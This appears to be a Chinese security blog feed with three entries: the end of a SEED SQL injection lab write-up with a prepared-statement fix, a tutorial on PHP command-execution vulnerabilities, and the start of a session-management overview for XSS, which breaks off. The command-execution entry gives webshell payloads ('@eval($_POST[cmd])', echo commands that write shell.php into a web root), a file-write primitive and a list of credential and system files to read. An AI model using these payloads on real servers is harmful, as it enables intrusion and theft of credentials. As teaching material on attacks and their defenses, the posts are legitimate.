name='Boby'#</code>。</li><li>注意：因为数据库中存储了密码SHA1值，因为我们直接修改密码时需要先进行SHA1转换。成功以修改后的密码登录boby账号。</li></ol><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311071810548.png"alt="image-20231107172621254" /><figcaption aria-hidden="true">image-20231107172621254</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311071810549.png"alt="image-20231107172605030" /><figcaption aria-hidden="true">image-20231107172605030</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311071810550.png"alt="image-20231107172610471" /><figcaption aria-hidden="true">image-20231107172610471</figcaption></figure><h2 id="task-4-countermeasure-prepared-statement">3.4 Task 4:Countermeasure — Prepared Statement</h2><p>SQL 注入漏洞的根本问题在于未能将代码与数据分开。在编写 SQL语句时，程序（如 PHP程序）知道哪一部分是数据，哪一部分是代码。不幸的是，当 SQL语句发送到数据库时，边界已经消失；SQL解释器看到的边界可能与开发人员设置的原始边界不同。要解决这个问题，必须确保服务器端代码和数据库中的边界视图保持一致。最安全的方法是使用准备语句。</p><p>要了解准备语句如何防止 SQL 注入，我们需要了解 SQL服务器接收查询时会发生什么。执行查询的高级工作流程如图 3所示。在编译步骤中，查询首先要经过解析和规范化阶段，即根据语法和语义检查查询。下一个阶段是编译阶段，在这一阶段，关键字（如SELECT、FROM、UPDATE等）被转换成机器可以理解的格式。基本上，在这一阶段，查询会被解释。在查询优化阶段，会考虑执行查询的不同计划数量，并从中选择最佳优化计划。所选计划存储在缓存中，因此每当有下一个查询进来时，就会根据缓存中的内容进行检查；如果缓存中已经存在内容，就会跳过解析、编译和查询优化阶段。然后，编译后的查询将被传递到执行阶段，并在该阶段实际执行。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312111514702.png"alt="image-20231211150736534" /><figcaption aria-hidden="true">image-20231211150736534</figcaption></figure><p>准备语句出现在编译之后，执行之前。预编译语句将经过编译步骤，并变成一个预编译查询，其中的数据占位符为空。要运行这个预编译查询，需要提供数据，但这些数据不会经过编译步骤，而是直接插入预编译查询，然后发送到执行引擎。因此，即使数据中包含SQL代码，在不经过编译步骤的情况下，代码也会被简单地视为数据的一部分，没有任何特殊含义。这就是准备语句防止SQL 注入攻击的方法。</p><p>下面是一个如何在 PHP 中编写准备语句的示例。在下面的示例中，我们使用了SELECT 语句。我们展示了如何使用准备语句重写易受 SQL 注入攻击的代码。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312111514703.png"alt="image-20231211150841695" /><figcaption aria-hidden="true">image-20231211150841695</figcaption></figure><p>上述代码容易受到 SQL 注入攻击。可将其重写如下：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312111514704.png"alt="image-20231211150940003" /><figcaption aria-hidden="true">image-20231211150940003</figcaption></figure><p>利用预处理语句机制，我们将向数据库发送 SQL语句的过程分为两步。第一步是只发送代码部分，即不包含实际数据的 SQL语句。这就是准备步骤。从上面的代码片段中我们可以看到，实际数据被问号（?）完成这一步后，我们使用bind param()将数据发送到数据库。数据库只会将这一步发送的所有数据视为数据，而不再是代码。它会将数据与准备语句中相应的问号绑定。在bind param() 方法中，第一个参数 "is "表示参数的类型：i "表示<code>$id</code> 中的数据为整数类型，"s "表示<code>$pwd</code>中的数据为字符串类型。</p><p><strong>任务</strong>：在本任务中，我们将使用准备语句机制来修复 SQL注入漏洞。为简单起见，我们在防御文件夹中创建了一个简化程序。我们将对该文件夹中的文件进行更改。如果将浏览器指向以下URL，就会看到一个类似于网络应用程序登录页面的页面。该页面允许您查询员工信息，但您需要提供正确的用户名和密码。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312111514705.png"alt="image-20231211151044411" /><figcaption aria-hidden="true">image-20231211151044411</figcaption></figure><p>在此页面输入的数据将被发送到服务器程序getinfo.php，该程序会调用一个名为 unsafe.php 的程序。这个 PHP 程序中的SQL 查询很容易受到 SQL 注入攻击。你的任务是使用准备语句修改 unsafe.php中的 SQL 查询，这样程序就能抵御 SQL注入攻击。在实验室设置文件夹中，unsafe.php 程序位于 image_www/Code/defense文件夹中。您可以直接在那里修改程序。完成后，需要重建并重新启动容器，否则更改不会生效。</p><p>你也可以在容器运行时修改该文件。在运行的容器中，unsafe.php 程序位于/var/www/SQL_Injection/defense 中。这种方法的缺点是，为了保持 docker镜像的小巧，我们只在容器内安装了一个名为 nano的非常简单的文本编辑器。它应该足以满足简单编辑的需要。如果你不喜欢这个编辑器，可以使用"apt install "在容器中安装你喜欢的命令行编辑器。例如，对于喜欢 vim的人来说，可以执行以下操作：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ apt install -y vim<br></code></pre></td></tr></table></figure><p>容器关闭并销毁后，该安装文件将被丢弃。如果想永久安装，请将安装命令添加到image_www 文件夹内的 Dockerfile 中。</p><p><strong>实验流程：</strong></p><ol type="1"><li><p>修改代码：使用预处理机制，实现代码与数据分离。代码流程：先创建一个SQL查询的准备语句，绑定参数，"ss"表示两个参数都是字符串类型，执行SQL查询，将查询结果的各个列的值绑定到相应的变量，最后从数据库中获取一行查询结果，将其存储在绑定的变量中。注：修改后需要重新构建容器镜像，启动容器。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// Function to create a sql connection.</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getDB</span>(<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-variable">$dbhost</span>=<span class="hljs-string">&quot;10.9.0.6&quot;</span>;<br>  <span class="hljs-variable">$dbuser</span>=<span class="hljs-string">&quot;seed&quot;</span>;<br>  <span class="hljs-variable">$dbpass</span>=<span class="hljs-string">&quot;dees&quot;</span>;<br>  <span class="hljs-variable">$dbname</span>=<span class="hljs-string">&quot;sqllab_users&quot;</span>;<br><br>  <span class="hljs-comment">// Create a DB connection</span><br>  <span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$dbhost</span>, <span class="hljs-variable">$dbuser</span>, <span class="hljs-variable">$dbpass</span>, <span class="hljs-variable">$dbname</span>);<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$conn</span>-&gt;connect_error) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connection failed: &quot;</span> . <span class="hljs-variable">$conn</span>-&gt;connect_error . <span class="hljs-string">&quot;\n&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-variable">$conn</span>;<br>&#125;<br><br><span class="hljs-variable">$input_uname</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$input_pwd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;Password&#x27;</span>];<br><span class="hljs-variable">$hashed_pwd</span> = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$input_pwd</span>);<br><br><span class="hljs-comment">// create a connection</span><br><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">getDB</span>();<br><br><span class="hljs-comment">// do the query</span><br><span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&quot;SELECT id, name, eid, salary, ssn</span><br><span class="hljs-string">FROM credential</span><br><span class="hljs-string">WHERE name= ? and Password= ?&quot;</span>);<br><span class="hljs-comment">// Bind parameters to the query</span><br><span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bind_param</span>(<span class="hljs-string">&quot;ss&quot;</span>, <span class="hljs-variable">$input_uname</span>, <span class="hljs-variable">$hashed_pwd</span>);<br><span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br><span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bind_result</span>(<span class="hljs-variable">$bind_id</span>, <span class="hljs-variable">$bind_name</span>, <span class="hljs-variable">$bind_eid</span>, <span class="hljs-variable">$bind_salary</span>, <span class="hljs-variable">$bind_ssn</span>);<br><span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br><br><br><span class="hljs-variable">$id</span>     = <span class="hljs-variable">$bind_id</span>;<br><span class="hljs-variable">$name</span>   = <span class="hljs-variable">$bind_name</span>;<br><span class="hljs-variable">$eid</span>    = <span class="hljs-variable">$bind_eid</span>;<br><span class="hljs-variable">$salary</span> = <span class="hljs-variable">$bind_salary</span>;<br><span class="hljs-variable">$ssn</span>    = <span class="hljs-variable">$bind_ssn</span>;<br><br><br><span class="hljs-comment">// close the sql connection</span><br><span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>正常查询个人信息，正常显示.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311071810552.png"alt="image-20231107172724532" /><figcaption aria-hidden="true">image-20231107172724532</figcaption></figure></li><li><p>通过SQL注入方式访问admin个人信息，没有显示信息，证明预处理语句生效.</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311071810553.png"alt="image-20231107172736731" /><figcaption aria-hidden="true">image-20231107172736731</figcaption></figure></li><li><p>预处理语句防范SQL注入原理：将用户输入的数据与SQL查询分开，通过参数绑定（同时指定了参数类型）和自动转义来防止SQL注入攻击，同时提供了更好的性能和可维护性。</p></li></ol><p>参考教程：</p><ol type="1"><li><ahref="https://seanxz401.github.io/2022/12/31/网络攻防-SQL注入/">网络攻防-SQL注入- Sean's Blog (seanxz401.github.io)</a></li><li><a href="https://gls.show/p/961c048e/">SEED-lab：SQL InjectionAttack Lab - 郭佳明的博客 (gls.show)</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>SEED-LABS</category>
      
      <category>Web Security</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>命令执行</title>
    <link href="/2023/11/04/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/Web%E6%B8%97%E9%80%8F/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2023/11/04/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/Web%E6%B8%97%E9%80%8F/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="命令执行漏洞概述">1. 命令执行漏洞概述</h1><h2 id="定义">1.1 定义</h2><p>命令执行漏洞是指攻击者可以随意执行系统命令，分为远程命令执行(远程代码执行）和系统命令执行两类。</p><h2 id="原理">1.2 原理</h2><p>应用程序有时需要调用一些执行命令的函数，由于服务器对代码中可执行的特殊函数入口没有做过滤，并且用户能够控制这些函数中的参数时，就可以将恶意命令拼接到正常命令中，从而造成命令执行攻击。命令执行漏洞可以分为远程命令执行（代码执行）和系统命令执行两类，常见危险函数也分为两类：代码执行函数和命令执行函数。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs stylus">PHP中常见代码执行函数：<br><span class="hljs-function"><span class="hljs-title">array_map</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">eval</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">assert</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">preg_replace</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">call_user_func</span><span class="hljs-params">()</span></span><br><span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>)动态函数<br><br>PHP中常见系统命令执行函数：<br><span class="hljs-function"><span class="hljs-title">system</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">exec</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">shell_exec</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">passthru</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">popen</span><span class="hljs-params">()</span></span><br>反引号<span class="hljs-string">&quot;`&quot;</span><br></code></pre></td></tr></table></figure><h2 id="条件">1.3 条件</h2><ul><li>用户能够控制的函数输入</li><li>存在可以执行代码或者系统命令的危险函数</li></ul><h2 id="管道符号">1.4 管道符号</h2><ul><li>Linux：<ul><li><p>；前面的执行完执行后面的，两者互不影响</p><ul><li>在终端中输入"whoami;ls"，查看";"管道符前后两个命令都正确的结果 <imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101808753.png"alt="image.png" /></li><li>在终端中输入"whoam;ls"，查看";"管道符前面命令错误，后面命令正确的结果<imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101808755.png"alt="image.png" /></li><li>在终端中输入"whoami;lss"，查看";"管道符前面命令正确，后面命令错误的结果<imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101808756.png"alt="image.png" /></li></ul></li><li><p>|是管道符，显示后面的执行结果</p><ul><li>在终端中输入"whoami|ls"，查看"|"管道符前后两个命令都正确的结果 <imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101808757.png"alt="image.png" /></li><li>在终端中输入"whoam|ls"，查看"|"管道符前面命令错误，后面命令正确的结果<imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101808758.png"alt="image.png" /></li><li>在终端中输入"whoami|lss"，查看"|"管道符前面命令正确，后面命令错误的结果<imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101808759.png"alt="image.png" /></li></ul></li><li><p>||当前面的执行出错时才执行后面的</p><ul><li>在终端中输入"whoami||ls"，查看"||"管道符前后两个命令都正确的结果<imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101808760.png"alt="image.png" /></li><li>在终端中输入"whoam||ls"，查看"||"管道符前面命令错误，后面命令正确的结果<imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101808761.png"alt="image.png" /></li><li>在终端中输入"whoami|lss"，查看"|"管道符前面命令正确，后面命令错误的结果<imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101808762.png"alt="image.png" /></li></ul></li></ul></li><li>Windows：<ul><li>&amp;前面的语句为假则直接执行后面的，类似于Lniux的<code>；</code></li><li>&amp;&amp;前面的语句为假则直接出错，后面的也不执行</li><li>|直接执行后面的语句.对比Lniux：如果前面出错，后面的命令也不会执行</li><li>||前面出错才执行后面的.同Lniux的<code>||</code></li></ul></li></ul><p>参考：<ahref="https://blog.csdn.net/qq_42024821/article/details/111477931">window和linux中管道符在命令执行中的用法_命令衔接符,能让注入的命令whoami得到执行的是-CSDN博客</a></p><h2 id="通用命令符">1.5 通用命令符</h2><ul><li><code>command1 &amp;&amp; command2</code>：command1执行成功才执行command2</li><li><code>command1 | command2</code>：只执行command2</li><li><code>command1 &amp; command2</code>：command1和command2之间互相不影响</li></ul><h2 id="常见场景">1.6 常见场景</h2><ul><li>Ping主机</li><li>DNS请求</li><li>Ofice文档</li><li>框架缺陷</li></ul><h2 id="危害">1.7 危害</h2><ul><li>继承Web服务程序的权限去执行系统命令(任意代码）或读写文件</li><li>反弹shell</li><li>控制整个网站甚至控制服务器</li><li>进一步内网渗透</li></ul><h1 id="远程命令执行">2. 远程命令执行</h1><h2 id="相关函数">2.1 相关函数</h2><p>在PHP下，允许命令执行的函数有: - <code>array_map()</code> -<code>eval()</code> - <code>assert()</code> -<code>preg_replace()</code> - <code>call user_func()</code> -<code>$a(Sb)</code></p><h3 id="array_map">2.1.1 array_map()</h3><p>功能：为数组的每个元素应用回调函数</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101808763.png"alt="image-20231110162302023" /><figcaption aria-hidden="true">image-20231110162302023</figcaption></figure><h3 id="eval">2.1.2 eval()</h3><p>功能：将字符串当作PHP代码执行</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101808764.png"alt="image-20231110145427894" /><figcaption aria-hidden="true">image-20231110145427894</figcaption></figure><h3 id="assert">2.1.3 assert()</h3><p>功能：同eval函数类似，也是将字符串当作PHP代码执行</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101808765.png"alt="image-20231110145700143" /><figcaption aria-hidden="true">image-20231110145700143</figcaption></figure><p>注意：eval函数与assert函数用法<strong>不同</strong>；eval是一个语言构造器，而不是一个函数，不能被可变函数调用；assert在php中被认为是一个函数，能被可变函数调用。</p><h3 id="preg_repalce">2.1.4 preg_repalce()</h3><p>功能：搜索subject中正则匹配pattern的部分，以replacement进行替换</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101808766.png"alt="image-20231110145838364" /><figcaption aria-hidden="true">image-20231110145838364</figcaption></figure><p>pattern：要搜索的模式，可以是一个字符串或字符串数组。当pattern处存在一个“/e”修饰符时，$replacement的值会被当成php代码来执行。</p><h3 id="call_user_func">2.1.5 call_user_func()</h3><p>功能：回调函数，把第一个参数作为回调函数使用，其余参数都是回调函数的参数。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101808767.png"alt="image-20231110150103346" /><figcaption aria-hidden="true">image-20231110150103346</figcaption></figure><h3 id="ab">2.1.6 <code>$a($b)</code></h3><p>功能：把第一个参数作为函数使用，其余参数都是函数的参数</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101808768.png"alt="image-20231110150409269" /><figcaption aria-hidden="true">image-20231110150409269</figcaption></figure><h2 id="利用">2.2 利用</h2><ul><li><p>利用远程命令执行漏洞可以执行一句话木马，从而GetShell，借助WebShell工具连接一句话木马：<code>?a=@eval($_POST[cmd]);</code></p></li><li><p>利用PHP魔术常量获取信息：PHP向它运行的任何脚本提供了大量的预定义常量。不过很多常量都是由不同的扩展库定义的，只有在加载了这些扩展库时才会出现，或者动态加载后，或者在编译时已经包括进去了。有八个魔术常量它们的值随着它们在代码中的位置改变而改变。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">__LINE__</span>       文件中的当前行号<br><span class="hljs-keyword">__FILE__</span>       文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名<br><span class="hljs-keyword">__DIR__</span>        文件所在的目录。如果用在被包括文件中，则返回被包括的文件所在的目录<br><span class="hljs-keyword">__FUNCTION__</span>   该常量所在的函数名称（PHP <span class="hljs-number">4.3</span>.<span class="hljs-number">0</span> 新加）。自PHP5起本常量返回该函数被定义时的名字（区分大小写）。在PHP4中该值总是小写字母的<br><span class="hljs-keyword">__CLASS__</span>      该类被定义时的名字（PHP <span class="hljs-number">4.3</span>.<span class="hljs-number">0</span> 新加）。自PHP5起本常量返回该类被定义时的名字（区分大小写）<br><span class="hljs-keyword">__TRAIT__</span>      Trait的名字（PHP <span class="hljs-number">5.4</span>.<span class="hljs-number">0</span> 新加）。自PHP5.<span class="hljs-number">4.0</span>起，PHP实现了代码复用的一个方法，称为traits<br><span class="hljs-keyword">__METHOD__</span>     类的方法名（PHP <span class="hljs-number">5.0</span>.<span class="hljs-number">0</span> 新加）。返回该方法被定义时的名字（区分大小写）<br><span class="hljs-keyword">__NAMESPACE__</span>  当前命名空间的名称（区分大小写）。此常量是在编译时定义的（PHP <span class="hljs-number">5.3</span>.<span class="hljs-number">0</span> 新增）<br>实例：<br>?a=<span class="hljs-keyword">print</span>(<span class="hljs-keyword">__LINE__</span>)<br></code></pre></td></tr></table></figure></li><li><p>读取敏感文件：利用远程命令执行漏洞可以读取一些操作系统的敏感文件，从而获取重要信息。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs awk">Windows<br>C:\boot.ini                                  <span class="hljs-regexp">//</span>查看系统版本<br>C:\windows\system32\inetsrv\MetaBase.xml     <span class="hljs-regexp">//</span>IIS配置文件<br>C:\windows\repair\sam                       <span class="hljs-regexp">//</span>windows初次安装的密码<br>C:\program Files\mysql\my.ini               <span class="hljs-regexp">//</span>Mysql配置信息<br>C:\program Files\mysql\data\mysql\user.MYD  <span class="hljs-regexp">//</span>Mysql root C:\windows\php.ini  <br>Linux<br><span class="hljs-regexp">/etc/</span>passwd                                       <span class="hljs-regexp">//</span>linux用户信息<br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/app/</span>apache2<span class="hljs-regexp">/conf/</span>httpd.conf            <span class="hljs-regexp">//</span>apache2配置文件<br><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/app/</span>php5<span class="hljs-regexp">/lib/</span>php.ini                   <span class="hljs-regexp">//</span>php配置文件<br><span class="hljs-regexp">/etc/</span>httpd<span class="hljs-regexp">/conf/</span>httpd.conf                       <span class="hljs-regexp">//</span>apache配置文件<br><span class="hljs-regexp">/etc/my</span>.cnf                                      <span class="hljs-regexp">//</span>Mysql配置文件<br>实例<br>?a=var_dump(file_get_contents(‘C:\Windows\win.ini’))<br></code></pre></td></tr></table></figure></li><li><p>利用远程命令执行漏洞可以执行写文件的代码，生成新的脚本文件（可以是一句话木马）：<code>?a=var_dump(file_put_contents($_POST[1],$_POST[2]);</code></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101808769.png"alt="image-20231110150832067" /><figcaption aria-hidden="true">image-20231110150832067</figcaption></figure></li></ul><h1 id="系统os命令执行">3. 系统(OS)命令执行</h1><h2 id="相关函数-1">3.1 相关函数</h2><p>允许系统命令执行的函数：</p><ul><li><code>system()</code></li><li><code>exec()</code></li><li><code>shell_exec()</code></li><li><code>passthru()</code></li><li><code>popen()</code></li><li>反引号</li></ul><h3 id="system">3.1.1 system()</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101808770.png"alt="image-20231110151747584" /><figcaption aria-hidden="true">image-20231110151747584</figcaption></figure><h3 id="exec">3.1.2 exec()</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101808771.png"alt="image-20231110151903975" /><figcaption aria-hidden="true">image-20231110151903975</figcaption></figure><h3 id="shell_exec">3.1.3 shell_exec()</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101808772.png"alt="image-20231110152043829" /><figcaption aria-hidden="true">image-20231110152043829</figcaption></figure><h3 id="passthru">3.1.4 passthru()</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101808773.png"alt="image-20231110152205248" /><figcaption aria-hidden="true">image-20231110152205248</figcaption></figure><h3 id="popen">3.1.5 popen()</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101808774.png"alt="image-20231110152306936" /><figcaption aria-hidden="true">image-20231110152306936</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311101808775.png"alt="image-20231110174746222" /><figcaption aria-hidden="true">image-20231110174746222</figcaption></figure><h3 id="反引号">3.1.6 反引号</h3><p>PHP 支持一个执行运算符：反引号（``）。注意这不是单引号！PHP将尝试将反引号中的内容作为 shell命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出）。使用反引号运算符的效果与函数shell_exec() 相同。</p><h2 id="利用-1">3.2 利用</h2><ul><li>写脚本文件：<code>?a=echo “&lt;?php phpinfo();?&gt;” &gt; C:\server\apache22\htdocs\os\info.php</code>;<code>?a=echo “&lt;?php @eval($_POST[666]);?&gt;” &gt; C:\server\apache22\htdocs\os\shell.php</code></li><li>执行操作系统命令，获取重要信息，如查看文件：<code>?a=type c:\windows\system32\drivers\etc\hosts</code>;</li></ul><p>q:以下哪种方法不能执行命令（C）</p><p>A. <code>system(whoami);</code></p><p>B. <code>system('whoami');</code></p><p>C. <code>system('eval(whoami);');</code></p><p>D.<code>eval('system(whoami);');</code></p><h1 id="命令执行漏洞防御">4. 命令执行漏洞防御</h1><ul><li>尽量不要执行外部命令</li><li>使用自定义函数或函数库来替代外部命令的功能</li><li>使用<code>escapeshellarg</code>函数来处理命令参数，该函数会将任何引起参数或命令结束的字符转义</li><li>使用<code>safe_mode_exec_dir</code>指定要执行程序的主目录，可以把会使用的命令提前放入此路径内</li></ul>]]></content>
    
    
    <categories>
      
      <category>安全服务</category>
      
      <category>Web渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>XSS</title>
    <link href="/2023/11/02/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/Web%E6%B8%97%E9%80%8F/XSS/"/>
    <url>/2023/11/02/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/Web%E6%B8%97%E9%80%8F/XSS/</url>
    
    <content type="html"><![CDATA[<h1 id="会话管理">1. 会话管理</h1><h2 id="web会话管理概述">1.1 Web会话管理概述</h2><p>HTTP是一种无状态协议，一次请求结束，客户端与服务端的连接就会断开，服务器再次收到请求时，无法识别此次请求是哪个用户发过来的，需要重新建立连接。为了判断发送请求的用户，需要一种记录用户的方式，也就是Web应用会话管理。</p><h2 id="web会话管理方式">1.2 Web会话管理方式</h2><h3 id="基于server端session的管理的方式">1.2.1基于server端session的管理的方式</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311091731090.png"alt="image-20231109103852913" /><figcaption aria-hidden="true">image-20231109103852913</figcaption></figure><p><strong>优点：</strong></p><ul><li>某些地方使用可以简化Web开发:如果在诸多Web页面间传递一个变量，那么用Session变量要比通过QueryString传递变量可使问题简化。</li><li>安全性好:客户端与服务端保持会话状态的媒介始终只是一个sessionID串，只要这个串够随机，攻击者就不能轻易冒充他人的sessionID进行操作;除非通过CSRF或http劫持的方式，才有可能冒充别人进行操作;即使冒充成功，也必须被冒充的用户session里面包含有效的登录凭证才行。</li></ul><p><strong>缺点：</strong></p><ul><li>这种方式将会话信息存储在Web服务器里面，当用户同时在线量比较多时，这些会话信息会占据比较多的内存。</li><li>当应用采用集群部署的时候，会遇到多台web服务器之间如何做session共享的问题。</li><li>多个应用要共享session时，还会遇到跨域问题。不同的应用可能部署的主机不一样，需要在各个应用做好跨域的处理。</li></ul><h3 id="cookie-based的管理方式">1.2.2 cookie-based的管理方式</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311091731091.png"alt="image-20231109104425691" /><figcaption aria-hidden="true">image-20231109104425691</figcaption></figure><p>Cookie和Session最大区别：</p><ul><li>Cookie将数据存储在客户端</li><li>Session将数据存储在服务端</li></ul><p><strong>优点：</strong></p><ul><li>实现了服务端的无状态化(最大的优点），服务端只需要负责创建和验证登录cookie即可，无需保持用户的状态信息。</li><li>cookie可以跨越同域名下的的多个网页，但不能跨越多个域名使用</li><li>可以设置有效期限，控制cookie的生命周期，使之不会永远有效(攻击者可能拿到的是过期的cookie）</li></ul><p><strong>缺点：</strong></p><ul><li>cookie有大小限制，存储不了太多数据。</li><li>每次传送cookie，增加了请求的数量，对访问性能也有影响。</li><li>同样存在跨域问题(不同域名无法互相读取cookie）</li></ul><h3 id="token-based的管理方式">1.2.3 token-based的管理方式</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311091731093.png"alt="image-20231109104742456" /><figcaption 